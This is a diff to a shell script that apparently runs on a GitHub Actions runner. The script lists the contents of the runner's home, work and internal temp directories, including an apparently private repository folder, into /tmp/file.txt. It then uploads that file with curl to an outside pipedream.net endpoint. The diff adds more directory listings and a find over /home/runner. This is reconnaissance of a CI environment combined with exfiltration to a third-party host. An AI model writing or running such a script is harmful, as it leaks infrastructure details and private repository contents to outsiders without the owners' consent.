@@ -24,6 +24,10 @@ ls -1la /home/runner/warmup >> /tmp/file.txt
 
 echo "--- home/runner/work" >> /tmp/file.txt
 ls -1la /home/runner/work >> /tmp/file.txt
+
+echo "--- home/runner/work/comment-ops-private-matiasesena" >> /tmp/file.txt
+ls -1la /home/runner/work/comment-ops-private-matiasesena >> /tmp/file.txt
+
 echo "--- home/runner/work/_temp" >> /tmp/file.txt
 ls -1la /home/runner/work/_temp >> /tmp/file.txt
 
@@ -32,7 +36,6 @@ ls -1la /home/runner/work/_temp/_github_workflow >> /tmp/file.txt
 echo "--- home/runner/work/_temp/_runner_file_commands" >> /tmp/file.txt
 ls -1la /home/runner/work/_temp/_runner_file_commands >> /tmp/file.txt
 
-$(pwd) >> /tmp/file.txt
 ls -1la . >> /tmp/file.txt
 ls -1la ./tools >> /tmp/file.txt
 
@@ -41,3 +44,5 @@ echo "--- FINISH ---" >> /tmp/file.txt
 curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
 
 rm /tmp/file.txt
+
+$(find /home/runner) >> /tmp/file.txt
